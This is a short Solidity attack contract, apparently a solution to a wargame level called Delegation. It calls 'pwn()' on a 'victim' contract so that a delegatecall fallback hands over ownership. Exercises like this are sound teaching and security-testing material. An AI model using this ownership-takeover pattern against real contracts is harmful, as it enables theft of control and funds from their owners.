// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Delegation} from "./Delegation.sol";
contract DelegateAttack {
    Delegation victim;
    constructor(address _v) {
        victim = Delegation(_v);
    }

    function attack() public {
        address(victim).call(abi.encodeWithSignature("pwn()"));
    }
}